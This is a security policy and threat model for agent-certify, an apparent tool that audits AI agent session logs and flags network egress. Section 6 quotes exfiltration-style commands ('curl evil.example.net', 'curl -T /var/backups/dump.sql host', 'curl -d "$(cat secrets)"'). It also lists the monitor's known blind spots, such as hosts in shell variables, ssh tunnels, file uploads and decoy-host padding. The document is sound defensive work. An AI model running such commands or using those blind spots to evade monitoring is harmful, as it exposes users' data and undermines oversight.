# Security Policy

## Reporting a vulnerability

If you discover a security vulnerability in agent-certify,
please report it by emailing david.martin@cognitive-engineering.dev.

Do NOT open a public issue for security vulnerabilities.

We will acknowledge receipt within 48 hours and provide
a fix timeline within 7 days.

## Threat model

agent-certify reads local log files, writes reports and certificates, and
optionally runs as an MCP server. It makes no network connections. The
surfaces that matter:

### 1. The MCP server (`agent-certify mcp`)

The server answers tool calls from an AI agent over stdin/stdout. Those
arguments are **untrusted**: an agent may be acting on instructions injected
into content it read. The server therefore:

- never expands environment variables in arguments (only `~`), so a value
  such as `$GITHUB_TOKEN` or `%API_KEY%` stays a literal file name;
- resolves every path argument (symlinks, `..`) and accepts it only inside
  `~/.claude/projects` or its working directory ("Path not allowed" otherwise);
- never returns a resolved path, file contents or exception text; unexpected
  errors go to stderr with a traceback and reach the client as a correlation id;
- does not fall back to other projects' sessions when no session is named;
- bounds each tool call to 30 seconds and every directory scan in depth (5
  levels), file count (1,000) and line size (10 MB).

What the server does return is structural metadata of sessions inside those
roots: tool names (including MCP server and tool names), sub-agent types and
descriptions, call and error counts, project folder names, session ids,
**network destinations** — the host names a session's tool calls pointed at —
and the **sizes** of what those calls sent, per destination (see §6).

Prompt text is never extracted. Tool inputs and tool outputs are **read but
not returned**: they are walked for host names only — including, for a shell
tool call, the host names in its command line (§6) — and nothing else of them
leaves the parser: not the argument text, not the command text, not the result
text, not URL credentials, ports or paths. If that metadata is sensitive in your setting, do
not register the server, or start it from a working directory that contains
nothing else.

### 2. Certificates and signing keys

- `verify` requires the issuer's public key, obtained out of band. The key
  embedded in a certificate is informational only and never trusted.
  `--allow-unsigned` bypasses the signature check explicitly, with a warning.
- Certificates expire (90 days by default) and can be bound to a system id
  (`--expect-system-id`); certificates issued before v0.5 have no expiry and
  are reported as legacy.
- Certificates are loaded with strict type and range validation; NaN and
  Infinity are rejected.
- The private key is a raw Ed25519 seed in hex, **not encrypted**. `keygen`
  creates it atomically with mode 600 and never follows a symlink; `certify`
  warns when it is readable by other users. On Windows the file inherits the
  folder's ACL. Keep keys outside repositories and shared folders, ideally in
  a secrets manager; whoever holds the key can issue certificates that verify.
- There is no revocation list yet: to retire a key, stop trusting its public
  key and re-issue certificates with a new one.

### 3. Baselines and policies

`.agent-certify/baseline.json` and `policy.json` are **not signed**. Anyone who
can write them (for example, a cloned repository that ships its own) can
relax anomaly detection or empty the policy. Pass `--baseline` / `--policy`
explicitly from a location you control when the verdict matters, and review
these files like code.

### 4. Log parsing

Logs are treated as hostile input: malformed, deeply nested or oversized
records are skipped and counted, never fatal, and the count is shown in
reports, OTel spans and certificates.

### 5. Files written

Reports, baselines, policies, OTel traces and certificates contain session
ids, project folder names (which encode local paths) and agent descriptions.
The `.agent-certify/` folder is created with a `.gitignore` that excludes its
contents; HTML reports are ignored by this repository's `.gitignore`. Do not
publish these files without reviewing them.

### 6. Network destinations (since v0.7.0)

This is the one place where agent-certify looks *inside* a tool call rather
than at its shape, so it is spelled out in full.

**What is read.** For every tool call in a session, the call's arguments are
walked for host names: the host of any full URL (`http`, `https`, `ws`, `wss`,
`ftp`, `ftps`), and the value of a field that names a destination (`url`,
`host`, `endpoint`, `base_url`, `webhook_url` … the full set is `NETWORK_KEYS`
in `agent_certify/domains.py`). A tool call's **result** is walked the same way,
but only when that call's own arguments already carried a destination — so a
file read or a search result full of URLs is not treated as egress. The walk is
bounded (8 levels deep, 2,000 strings, 64 KB per string, 200 hosts per call).

**What is not read at all** (since v0.8.1). Two categories of value are
skipped before anything else happens, because reading them produced findings
about traffic that never existed:

- **file and document content.** The value of a field that carries content —
  `content`, `contents`, `new_string`, `old_string`, `file_text`, `new_source`,
  `text`, `body`, `edits`, `patch`, `diff`, `replacement`; the full set is
  `CONTENT_KEYS` in `agent_certify/domains.py` — is not walked, whatever the
  tool. A session that *writes* `curl evil.example.net` into a test file, a
  README or a code example has contacted nobody. This is the same distinction
  already made for a tool's result, applied to the arguments of a tool that
  writes; the `Bash` call that later runs what was written is read exactly as
  before, since `command` is not a content key.
- **anything that is not shaped like a host.** The host of a URL now passes the
  same shape test as a bare value: at least one dot and a letters-only suffix,
  or an address literal (v4 or bracketed v6), or `localhost`. Trailing prose
  and markdown punctuation is stripped first. `https://a`, `http://api/x` and a
  URL at the end of a markdown span used to be recorded as the destinations
  `a`, `api` and `` x.example.com` ``.

Measured over eleven held-out real sessions (baselines of two to four sessions, so a worst case), before and after, back to back on the same files: **109 anomalies before, 72 after; 94 critical before, 58 after**. Of the 104 hosts read before, 43 stopped being read, and **not one of them had been contacted** — traced key by key: 16 were not shaped like a host, 19 appeared only in a file-writing argument, 8 were a fragment of a quoted argument. Every genuine destination survived, the outbound-volume spike included. The benchmark injects a clean `Write` call whose contents name a
host (`written_url`) so the content claim stays measured.

**The command line of a shell tool call is read too** (since the
`shell_domain` blind spot was closed; it is a *new category of input data*, so
it is named here under the review rule below). The value of a field that
carries a command — `command`, `cmd`, `script` and their variants, the full set
is `SHELL_KEYS` — is parsed as a command line: split into segments on `|`,
`||`, `&&`, `;` and `&` **outside quotes** (a line break always separates, and
quoting is judged per line), tokenised with `shlex`, wrappers (`sudo`,
`env VAR=x`, `time`, `nohup`, `command`, `exec`) and leading `VAR=value`
assignments dropped. A separator inside a quoted argument does not start a
command, so `git commit -m "fix; curl api.example.net"` reads as the one
command it is; a line whose quoting does not balance falls back to splitting on
every separator. **Only host names are taken out of it, and only from the
arguments of a known network client** (`curl`, `wget`, `ssh`, `scp`, `nc`,
`git clone` … the full set is `NETWORK_COMMANDS`): nothing is read from the
arguments of any other program, and nothing of the command line itself — not
the program, not the flags, not the data, not file paths, not credentials in a
`-u` argument — is kept, logged, reported or transmitted.

A command **inside** a command is read the same way, one level deep
(`MAX_SHELL_DEPTH = 1`): the value of `bash -c` and the other shell wrappers
(`_SHELL_WRAPPERS`), and the remote command of `ssh host '<command>'`. The
inner program is judged by the same rule, and nothing but host names comes out
of it either.

The command is **parsed, never evaluated and never executed**: no variable is
expanded, no substitution is run, no file is opened, nothing is spawned. A host
built in a shell variable, or at the far end of an `ssh -L` forwarding, is
consequently not read at all — both are measured blind spots
(`shell_var_domain`, `ssh_tunnel_domain`) in the injection benchmark. The same
bounds apply, with each argument examined costing one against the 2,000-string
budget, nesting bounded by the depth limit, and a command line that fails to
tokenise falling back to a whitespace split rather than raising.

**How much is measured** (since v0.8.0). For a call that named a destination,
two **sizes** are computed and nothing else:

- **the outbound size**: the UTF-8 size of the call's arguments, serialised as
  compact JSON with sorted keys — one number, computed the same way for every
  parser so the same call measures the same whatever log it came from;
- **how much of it was a declared payload**: for a shell command line, the size
  of the values of the options that carry a request body
  (`curl -d`/`--data`/`--data-raw`/`--data-binary`/`--data-urlencode`/`-F`/
  `--form`/`-T`, `wget --post-data`/`--body-data`, httpie's `key=value`), when
  the value is literal. The full set is `DATA_OPTIONS` in
  `agent_certify/domains.py`.

The second is a *part of* the first, not an addition to it: a literal body is
already inside the argument text that carried it, so it is counted once and
reported separately. The outbound size is attributed to every destination of
that call. A call that named no destination is not measured at all.

**What the log cannot show, and what is therefore not claimed.** These are
sizes *written in a log*, not bytes observed on a network:

- **a file an upload named is not sized.** `curl -T /var/backups/dump.sql host`
  and `curl -d @dump.sql host` count **zero** payload bytes, because the log
  holds the file's name and never its size. A ten-gigabyte dump and a
  ten-kilobyte one produce the same record. Nothing is read from the file
  system to find out: the tool reads logs. This is a measured blind spot
  (`file_upload_exfil` in the injection benchmark), not an estimate.
- **the bytes actually sent are not known.** Compression, chunking, headers,
  TLS overhead, a retried request, a request that never left the machine: none
  of that is in a log. The number is a comparable signal about one
  destination, not an accounting of the wire, and the anomaly says so in its
  own detail line.
- **a body built at run time is not sized**: `curl -d "$(cat secrets)"` or a
  variable expansion carries no literal value. The command is parsed, never
  evaluated (above), so there is nothing to measure.

**What is kept.** Only host names and **numbers**. Host names lowercased, with
URL credentials, port, path and query discarded, and nothing resolved: a name
is never turned into an address. The numbers are byte counts and call counts
per destination, and counts of calls whose scan hit a limit. No argument text,
result text, command text, payload, prompt or file content is kept at any
point — a size is not a sample. The hosts and their numbers live on the graph
(`seen_domains`, `egress_bytes`, `egress_calls`) and on the calling node, so a
report can say which tool reached which host and with how much.

**What is stored on disk.** `agent-certify learn` writes every host it saw into
`known_domains` in `.agent-certify/baseline.json`, alongside the `*.cn`-style
patterns an operator accepted or rejected, and — since v0.8.0 — the mean,
deviation, maximum and session count of the **bytes** each of those hosts
received (`domain_egress_volume`). That file is a list of host names the
sessions contacted and four numbers for each; treat it like the rest of §5 and
review it before publishing it. Certificates do **not** carry destinations: `graph_hash()` covers
node roles, kinds and links only, which is also why certificates issued before
v0.7.0 still verify.

**What is transmitted.** When a session reaches a host the baseline never saw,
one matching a rejected pattern, or one receiving far more data than usual, the
host name and the byte count appear in the anomaly's `message`, `value` and
`detail` fields. Those fields are returned verbatim to
the MCP client by the `check_anomalies` tool. They also appear in text,
Markdown, JSON and HTML reports, and in the `message` attribute of an
`anomaly.*` OTel span event — which, if you export spans, leaves the machine.
A host name is therefore the one piece of tool-call *content* that can travel
out of this tool.

**When the scan is cut short.** Reading destinations out of an argument object
is bounded (200 hosts per call, 2,000 strings per call, 32 levels of nesting,
10 MB of any one string — the same limit the parsers already apply to a
record). Reaching a bound is counted on the call and on the graph and reported
as a `destination_scan_truncated` anomaly, critical when that call did name a
destination. Before v0.8.0 a host past a bound was dropped in silence, which
made the bound an evasion: 200 decoy hosts in one command, or a block of
padding, hid the next one for free. Padding is no longer a bound at all — a
string is read whole, to the 10 MB limit — and the hosts-per-call bound remains
but is now published.

**Review rule.** Any feature that reads a new category of input data — a new
field, a new part of a record, anything beyond the structural metadata listed
in §1 — requires a review and an update of this document in the same change.
Network destinations shipped in v0.7.0 without one, and this section is the
correction. Two features have gone through it since, each documented in the
change that added it: reading the command line of shell tool calls, and
measuring the size of what a call sent.

## Supported versions

Security fixes go into the latest minor version.
